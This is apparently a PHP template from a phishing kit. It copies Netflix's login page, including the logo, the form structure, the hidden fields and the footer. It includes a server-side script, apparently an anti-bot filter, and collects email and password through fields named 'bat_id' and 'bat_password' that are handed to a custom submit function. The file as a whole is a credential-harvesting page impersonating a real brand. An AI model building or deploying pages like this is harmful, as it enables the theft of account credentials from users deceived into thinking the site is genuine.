<?php include '../../server/ab.php';


?>

<body>

    <div id="appMountPoint" style="transition-duration : 2s" class="transition">
        <div class="login-wrapper hybrid-login-wrapper">
            <div class="login-wrapper-background">
                <img class="concord-img vlv-creative" src="../assets/images/background.jpg" srcset="../assets/images/background.jpg 1000w, assets/images/background.jpg 1500w, ../assets/images/background.jpg 1800w" alt="">
            </div>
            <div class="nfHeader login-header signupBasicHeader">
                <a href="/" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netflix</span></a></div>
            <div class="login-body">
                <div>
                    <div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container">
                        <div class="hybrid-login-form-main">
                            <h1 data-uia="login-page-title"><?php echo $traduce["$lang"]["login_title"];?></h1>
                            <div data-uia="error-message-container"style="display: none;" id="error" class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div data-uia="text"  class="ui-message-contents" id="error-text"></div></div>
                                <div data-uia="login-field+container" class="nfInput nfEmailPhoneInput login-input login-input-email">
                                    <div class="nfInputPlacement">
                                        <div class="nfEmailPhoneControls">
                                            <label class="input_id">
                                                <input type="text" style="padding-top : 0;" data-uia="login-field" name="bat_id" placeholder="<?php echo $traduce["$lang"]["email_placeholder"];?>" class="nfTextField" id="mail" value="" tabindex="0" autocomplete="email" dir="">
                                            </label>
                                        </div>
                                    </div>
                                   
                                </div>
                                <div data-uia="password-field+container" class="nfInput nfPasswordInput login-input login-input-password">
                                    <div class="nfInputPlacement">
                                        <div class="nfPasswordControls">
                                            <label class="input_id">
                                            <input type="password" style="padding-top : 0;" data-uia="password-field " name="bat_password" placeholder="<?php echo $traduce["$lang"]["password_placeholder"];?>" class="nfTextField" id="pass" value="" tabindex="0" autocomplete="password" dir="">                                             
                                        </label>
                                    </div>
                                </div>
                               


                                <button class="btn login-button btn-submit btn-small"  onclick="submit('1')" type="submit" autocomplete="off" name="bat_login_submit" tabindex="0" data-uia="login-submit-button"><?php echo $traduce["$lang"]["login_button"];?></button>
                                <div class="hybrid-login-form-help">
                                    <div class="ui-binary-input login-remember-me">
                                        <input type="checkbox" class="" name="rememberMe" id="bxid_rememberMe_true" value="true" tabindex="0" data-uia="rememberMe" checked=""><label for="bxid_rememberMe_true" data-uia="label+rememberMe"><span class="login-remember-me-label-text"><?php echo $traduce["$lang"]["remember"];?></span></label>
                                        <div class="helper"></div>
                                    </div>
                                    <a class="link login-help-link" target="_self" data-uia="login-help-link"><?php echo $traduce["$lang"]["help"];?></a>
                                </div>
                                <input type="hidden" name="flow" value="websiteSignUp">
                                <input type="hidden" name="mode" value="login">
                                <input type="hidden" name="action" value="loginAction">
                                <input type="hidden" name="withFields" value="rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode,recaptchaResponseToken,recaptchaError,recaptchaResponseTime">
                                <input type="hidden" name="authURL" value="1632344666820.So8GI1zibiQnlDRSi9BYfs9luFg=">
                                <input type="hidden" name="nextPage" value="">
                                <input type="hidden" name="showPassword" value="">
                                <input type="hidden" name="countryCode" value="+34">
                                <input type="hidden" name="countryIsoCode" value="ES">
                        </div>
                        <div class="hybrid-login-form-other">
                          
                            <div class="login-signup-now" data-uia="login-signup-now"><?php echo $traduce["$lang"]["firstvisit"];?><a class=" " target="_self" href="/"></a><?php echo $traduce["$lang"]["register"];?>.</div>
                            <div class="recaptcha-terms-of-use" data-uia="recaptcha-terms-of-use">
                                <p><span><?php echo $traduce["$lang"]["captcha1"];?>.</span>&nbsp;<button class="recaptcha-terms-of-use--link-button" data-uia="recaptcha-learn-more-button"><?php echo $traduce["$lang"]["captcha2"];?>.</button></p>

                            </div>
                        </div>
                    </div>
                </div>
            </div>

    </div><div class="site-footer-wrapper centered">
    <div class="footer-divider"></div>
    <div class="site-footer">
        <p class="footer-top"><?php echo $traduce["$lang"]["footer_question"];?>&nbsp;?</p>
        <ul class="footer-links structural">
            <li class="footer-link-item" placeholder="footer_responsive_link_faq_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_faq"><span id="" data-uia="data-uia-footer-label"><?php echo $traduce["$lang"]["footer_faq"];?></span></a></li>
            <li class="footer-link-item" placeholder="footer_responsive_link_help_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_help"><span id="" data-uia="data-uia-footer-label"><?php echo $traduce["$lang"]["footer_help"];?></span></a></li>
            <li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_terms"><span id="" data-uia="data-uia-footer-label"><?php echo $traduce["$lang"]["footer_cou"];?></span></a></li>
            <li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_privacy_separate_link"><span id="" data-uia="data-uia-footer-label"><?php echo $traduce["$lang"]["footer_conf"];?></span></a></li>
            <li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_cookies_separate_link"><span id="" data-uia="data-uia-footer-label"><?php echo $traduce["$lang"]["footer_cook"];?></span></a></li>
            <li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_corporate_information"><span id="" data-uia="data-uia-footer-label"><?php echo $traduce["$lang"]["footer_lm"];?></span></a></li>
        </ul>
        <div class="lang-selection-container" id="lang-switcher">
            <div data-uia="language-picker+container" class="ui-select-wrapper"><label for="lang-switcher-select" class="ui-label"><span class="ui-label-text"><?php echo $traduce["$lang"]["footer_ls"];?></span></label>
                <div class="select-arrow medium prefix globe"><select data-uia="language-picker" class="ui-select medium" id="lang-switcher-select" tabindex="0" placeholder="lang-switcher"><option selected="" lang="fr" value="/?locale=fr-FR" data-language="fr" data-country="FR"><?php echo $traduce["$lang"]["footer_lang"];?></option><option lang="en" value="/?locale=en-FR" data-language="en" data-country="FR">English</option></select></div>
            </div>
        </div>
    </div>
</div>
    </div>
            
       
    </div>
    <div>

    </div>
</body>